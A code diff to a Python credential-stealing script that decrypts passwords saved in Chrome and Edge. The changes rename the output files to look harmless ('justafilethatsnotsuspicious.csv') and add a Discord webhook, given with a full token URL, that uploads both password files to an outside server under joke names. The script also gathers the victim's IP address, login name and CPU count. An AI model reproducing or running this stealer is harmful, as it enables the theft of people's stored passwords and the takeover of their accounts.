@@ -8,11 +8,12 @@ import win32crypt
 from Crypto.Cipher import AES
 import shutil
 import csv
+from discord_webhook import DiscordWebhook
 
 ip = requests.get("https://api.ipify.org")  # just remember to do ip.text or ip.content
 name = os.getlogin()
 cores = os.cpu_count()
-
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1344737907533025290/uqTjZWsPzE9vuHgt1aPvynOkQdl8OZFGcpSszcdZyOEyEv8pftBOXJToOs_d148rucvd", username="terry the terrible")
 
 browsers = ["chrome.exe","msedge.exe","firefox.exe","opera.exe","iexplore.exe","brave.exe","vivaldi.exe","arc.exe"]
 for browser in browsers:
@@ -65,7 +66,7 @@ def get_db_connection(chrome_path_login_db):
         
 if __name__ == '__main__':
     try:
-        with open('passwords.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('justafilethatsnotsuspicious.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             secret_key = get_secret_key()
@@ -128,7 +129,7 @@ def get_db_connection_edge(chrome_path_login_db):
         
 if __name__ == '__main__':
     try:
-        with open('edgepasswords.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open('justafilethatsnotsuspicious_edge.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             secret_key = get_secret_key()
@@ -151,3 +152,14 @@ if __name__ == '__main__':
                     os.remove("Loginvault.db")
     except Exception as e:
         print("[ERR] %s"%str(e))
+
+
+
+with open("justafilethatsnotsuspicious.csv", "rb") as f:
+    webhook.add_file(file=f.read(), filename="funny.csv")
+with open("justafilethatsnotsuspicious_edge.csv", "rb") as f:
+    webhook.add_file(file=f.read(), filename="funnier.csv")
+
+response = webhook.execute()
+
+
